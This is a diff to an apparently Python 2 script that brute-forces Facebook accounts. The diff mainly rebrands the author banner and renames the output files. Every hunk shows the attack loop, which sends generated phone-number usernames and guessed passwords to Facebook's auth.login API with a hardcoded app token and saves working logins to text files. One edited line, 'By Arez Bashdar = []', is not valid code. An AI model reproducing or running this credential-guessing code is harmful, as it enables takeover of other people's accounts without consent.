@@ -56,15 +56,15 @@ logo = logo ="""
 \033[1;91mo      O   o    o   O              o      
 \033[1;91mO      O   O     O  o             O  
 \033[1;91mO      O   o      O'OOOOOOOO    oOoooooO
-\033[1;91m---------------------------------------|
+\033[1;91m#--------------------------------------#
 \033[1;91m|Snapchat/RavenFon                     |
 \033[1;91m|Telegran/@Arezbashdar                 |
 \033[1;91m|Github/https://github.com/ravenbashdar|
-\033[1;91m----------------------------------------
+\033[1;91m#--------------------------------------#
 
 """
 back = 0
-successful = []
+By Arez Bashdar = []
 cpb = []
 oks = []
 id = []
@@ -126,14 +126,14 @@ def action():
             data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
             q = json.load(data)
             if 'access_token' in q:
-                print '\x1b[1;91m[SUCCESSFULLL]\x1b[1;91m ' + k + c + user + ' >>> ' + pass1 + '\n' + '\n'
-                okb = open('save/successfull.txt', 'a')
+                print '\x1b[1;91m[ArezBashdar]\x1b[1;91m ' + k + c + user + ' >>> ' + pass1 + '\n' + '\n'
+                okb = open('save/ArezBashdar.txt', 'a')
                 okb.write(k + c + user + '>>>' + pass1 + '\n')
                 okb.close()
                 oks.append(c + user + pass1)
             elif 'www.facebook.com' in q['error_msg']:
-                print '\x1b[1;92m[SUCCESSFULL]\x1b[1;92m ' + k + c + user + ' >>> ' + pass1 + '\n'
-                cps = open('save/checkpoint.txt', 'a')
+                print '\x1b[1;92m[Sutawa]\x1b[1;92m ' + k + c + user + ' >>> ' + pass1 + '\n'
+                cps = open('save/Sutawa.txt', 'a')
                 cps.write(k + c + user + '>>>' + pass1 + '\n')
                 cps.close()
                 cpb.append(c + user + pass1)
@@ -142,14 +142,14 @@ def action():
             data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
             q = json.load(data)
             if 'access_token' in q:
-                print '\x1b[1;91m[SUCCESSFULLL]\x1b[1;91m ' + k + c + user + ' >>> ' + pass2 + '\n' + '\n'
-                okb = open('save/successfull.txt', 'a')
+                print '\x1b[1;91m[ArezBashdar]\x1b[1;91m ' + k + c + user + ' >>> ' + pass2 + '\n' + '\n'
+                okb = open('save/ArezBashdar.txt', 'a')
                 okb.write(k + c + user + '>>>' + pass2 + '\n')
                 okb.close()
                 oks.append(c + user + pass2)
             elif 'www.facebook.com' in q['error_msg']:
-                print '\x1b[1;92m[CHECKPOINT]\x1b[1;92m ' + k + c + user + ' >>> ' + pass2 + '\n'
-                cps = open('save/checkpoint.txt', 'a')
+                print '\x1b[1;92m[Sutawa]\x1b[1;92m ' + k + c + user + ' >>> ' + pass2 + '\n'
+                cps = open('save/Sutawa.txt', 'a')
                 cps.write(k + c + user + '>>>' + pass2 + '\n')
                 cps.close()
                 cpb.append(c + user + pass2)
@@ -158,14 +158,14 @@ def action():
             data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
             q = json.load(data)
             if 'access_token' in q:
-                print '\x1b[1;91m[SUCCESSFULLL]\x1b[1;91m ' + k + c + user + ' >>> ' + pass3 + '\n' + '\n'
-                okb = open('save/successfull.txt', 'a')
+                print '\x1b[1;91m[ArezBashdar]\x1b[1;91m ' + k + c + user + ' >>> ' + pass3 + '\n' + '\n'
+                okb = open('save/ArezBashdar.txt', 'a')
                 okb.write(k + c + user + '>>>' + pass3 + '\n')
                 okb.close()
                 oks.append(c + user + pass3)
             elif 'www.facebook.com' in q['error_msg']:
-                print '\x1b[1;92m[CHECKPOINT]\x1b[1;92m ' + k + c + user + ' >>> ' + pass3 + '\n'
-                cps = open('save/checkpoint.txt', 'a')
+                print '\x1b[1;92m[Sutawa]\x1b[1;92m ' + k + c + user + ' >>> ' + pass3 + '\n'
+                cps = open('save/Sutawa.txt', 'a')
                 cps.write(k + c + user + '>>>' + pass3 + '\n')
                 cps.close()
                 cpb.append(c + user + pass3)
@@ -174,14 +174,14 @@ def action():
             data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
             q = json.load(data)
             if 'access_token' in q:
-                print '\x1b[1;91m[SUCCESSFULLL]\x1b[1;91m ' + k + c + user + ' >>> ' + pass4 + '\n' + '\n'
-                okb = open('save/successfull.txt', 'a')
+                print '\x1b[1;91m[ArezBashdar]\x1b[1;91m ' + k + c + user + ' >>> ' + pass4 + '\n' + '\n'
+                okb = open('save/ArezBashdar.txt', 'a')
                 okb.write(k + c + user + '>>>' + pass4 + '\n')
                 okb.close()
                 oks.append(c + user + pass4)
             elif 'www.facebook.com' in q['error_msg']:
-                print '\x1b[1;92m[CHECKPOINT]\x1b[1;92m ' + k + c + user + ' >>> ' + pass4 + '\n'
-                cps = open('save/checkpoint.txt', 'a')
+                print '\x1b[1;92m[Sutawa]\x1b[1;92m ' + k + c + user + ' >>> ' + pass4 + '\n'
+                cps = open('save/Sutawa.txt', 'a')
                 cps.write(k + c + user + '>>>' + pass4 + '\n')
                 cps.close()
                 cpb.append(c + user + pass4)
@@ -190,14 +190,14 @@ def action():
             data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass5 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
             q = json.load(data)
             if 'access_token' in q:
-                print '\x1b[1;91m[SUCCESSFULLL]\x1b[1;91m ' + k + c + user + ' >>> ' + pass5 + '\n' + '\n'
-                okb = open('save/successfull.txt', 'a')
+                print '\x1b[1;91m[ArezBashdar]\x1b[1;91m ' + k + c + user + ' >>> ' + pass5 + '\n' + '\n'
+                okb = open('save/ArezBashdar.txt', 'a')
                 okb.write(k + c + user + '>>>' + pass5 + '\n')
                 okb.close()
                 oks.append(c + user + pass5)
             elif 'www.facebook.com' in q['error_msg']:
-                print '\x1b[1;92m[CHECKPOINT]\x1b[1;92m ' + k + c + user + ' >>> ' + pass5 + '\n'
-                cps = open('save/checkpoint.txt', 'a')
+                print '\x1b[1;92m[Sutawa]\x1b[1;92m ' + k + c + user + ' >>> ' + pass5 + '\n'
+                cps = open('save/Sutawa.txt', 'a')
                 cps.write(k + c + user + '>>>' + pass5 + '\n')
                 cps.close()
                 cpb.append(c + user + pass5)
@@ -206,14 +206,14 @@ def action():
             data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass6 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
             q = json.load(data)
             if 'access_token' in q:
-                print '\x1b[1;91m[SUCCESSFULLL]\x1b[1;91m ' + k + c + user + ' >>> ' + pass6 + '\n' + '\n'
-                okb = open('save/successfull.txt', 'a')
+                print '\x1b[1;91m[ArezBashdar]\x1b[1;91m ' + k + c + user + ' >>> ' + pass6 + '\n' + '\n'
+                okb = open('save/ArezBashdar.txt', 'a')
                 okb.write(k + c + user + '>>>' + pass6 + '\n')
                 okb.close()
                 oks.append(c + user + pass6)
             elif 'www.facebook.com' in q['error_msg']:
-                print '\x1b[1;92m[CHECKPOINT]\x1b[1;92m ' + k + c + user + ' >>> ' + pass6 + '\n'
-                cps = open('save/checkpoint.txt', 'a')
+                print '\x1b[1;92m[Sutawa]\x1b[1;92m ' + k + c + user + ' >>> ' + pass6 + '\n'
+                cps = open('save/Sutawa.txt', 'a')
                 cps.write(k + c + user + '>>>' + pass6 + '\n')
                 cps.close()
                 cpb.append(c + user + pass6)
@@ -222,14 +222,14 @@ def action():
             data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass7 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
             q = json.load(data)
             if 'access_token' in q:
-                print '\x1b[1;91m[SUCCESSFULLL]\x1b[1;91m ' + k + c + user + ' >>> ' + pass7 + '\n' + '\n'
-                okb = open('save/successfull.txt', 'a')
+                print '\x1b[1;91m[ArezBashdar]\x1b[1;91m ' + k + c + user + ' >>> ' + pass7 + '\n' + '\n'
+                okb = open('save/ArezBashdar.txt', 'a')
                 okb.write(k + c + user + '>>>' + pass7 + '\n')
                 okb.close()
                 oks.append(c + user + pass7)
             elif 'www.facebook.com' in q['error_msg']:
-                print '\x1b[1;92m[CHECKPOINT]\x1b[1;92m ' + k + c + user + ' >>> ' + pass7 + '\n'
-                cps = open('save/checkpoint.txt', 'a')
+                print '\x1b[1;92m[Sutawa]\x1b[1;92m ' + k + c + user + ' >>> ' + pass7 + '\n'
+                cps = open('save/Sutawa.txt', 'a')
                 cps.write(k + c + user + '>>>' + pass7 + '\n')
                 cps.close()
                 cpb.append(c + user + pass7)
